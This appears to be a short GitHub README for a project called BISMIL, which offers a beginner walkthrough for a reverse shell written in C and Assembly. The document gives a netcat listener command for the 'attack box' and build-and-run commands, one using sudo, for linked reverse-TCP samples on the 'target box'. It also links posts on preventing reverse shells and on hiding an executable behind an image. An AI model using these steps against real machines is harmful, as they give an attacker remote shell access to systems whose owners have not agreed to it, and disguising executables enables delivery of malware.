<h1>BISMIL</h1>
<h2>Pure way to start hacking programming in C and Assembly languages</h2>
<h3>ON ATTACK BOX RUN:</h3>
<pre>nc -lvp 444</pre>
<img src="https://raw.githubusercontent.com/dewebdes/bismil/master/1.jpeg">
<h3>ON TARGET BOX:</h3>
<ul>
  <li>We need an signal, like exe file or just a tcp request</li>
  <li><a href="https://github.com/dewebdes/bismil/blob/master/rsv.c">PURE C Sample</a><p>
    gcc rsv.c -o rsv
    
sudo ./rsv
    </p></li>
    <li><a href="https://github.com/dewebdes/bismil/blob/master/reverse_tcp.asm">ASM Sample</a><p>
    nasm -f elf32 reverse_tcp.asm && ld -m elf_i386 reverse_tcp.o -o reverse_tcp
    </p></li>
</ul>

<img src="https://raw.githubusercontent.com/dewebdes/bismil/master/2.jpeg">
<hr>
<h2><a href="https://www.linkedin.com/posts/kaveh-eyni-08060b59_protection-reverseengineering-snort-activity-6594048815320436736-WtVH">How to Prevent Reverse Shell?</a></h2>
<hr>
<h2><a href="https://www.linkedin.com/posts/kaveh-eyni-08060b59_viruses-exploitation-pictures-activity-6598750617307619328-g2Ke">Hide EXE Behind Image</a></h2>
